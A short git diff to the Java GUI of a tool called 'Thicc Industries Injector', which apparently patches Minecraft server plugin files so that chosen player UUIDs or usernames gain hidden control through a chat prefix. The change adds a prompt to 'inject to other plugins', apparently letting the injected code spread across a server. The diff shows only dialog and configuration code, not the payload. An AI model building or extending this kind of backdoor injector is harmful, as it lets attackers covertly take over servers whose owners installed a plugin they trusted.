@@ -74,6 +74,7 @@ public class InjectorGUI{
         Boolean UUIDsAreUsernames;
         String UUIDList;
         String ChatPrefix;
+        Boolean InjectOther;
 
         int usernames = JOptionPane.showConfirmDialog(null, "Use offline mode? (Usernames)", "Thicc Industries Injector", JOptionPane.YES_NO_OPTION);
         UUIDsAreUsernames = usernames == JOptionPane.YES_OPTION;
@@ -106,11 +107,18 @@ public class InjectorGUI{
         if(ChatPrefix.isEmpty())
             return;
 
+        InjectOther = JOptionPane.showConfirmDialog(
+                null,
+                "Inject to other plugins:",
+                "Thicc Industries Injector",
+                JOptionPane.YES_NO_OPTION
+        ) == JOptionPane.YES_OPTION;
+
         //Parse uuids
 
         String[] splitUUID = UUIDList.split(",");
 
-        Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix);
+        Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix, InjectOther);
         boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);
 
         if(result2){
